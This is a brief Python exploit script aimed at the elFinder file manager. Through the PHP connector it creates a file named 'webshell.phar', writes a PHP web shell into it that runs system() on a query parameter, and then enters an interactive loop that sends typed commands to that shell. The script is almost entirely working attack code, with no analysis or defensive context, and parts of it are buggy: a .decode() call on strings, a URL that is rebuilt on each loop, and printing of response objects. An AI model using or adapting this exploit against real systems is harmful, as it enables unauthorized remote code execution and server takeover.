#!/usr/bin/python3


import requests
import sys
import re



def main():
    url = sys.argv[1]
    sess = requests.Session()

    ress = sess.get(url=url+"elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=webshell.phar")

    file_hash = re.findall(r'l1_[A-Za-z0-9]{10,18}', ress.text)
    
    hash_file = ''
    for h in file_hash:
        hash_file = h.decode()

    new_ress = sess.get(url=url+"elFinder/php/connector.minimal.php?cmd=put&content=<?='';system($_GET[0]);?>&target="+hash_file)


    
    while True:

        cmd = input("cmd>: ")
        print(cmd)
        url=f"http://{url}elFinder/files/webshell.phar?0={cmd}"
        res=sess.get(url, timeout=20)
        print(res)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
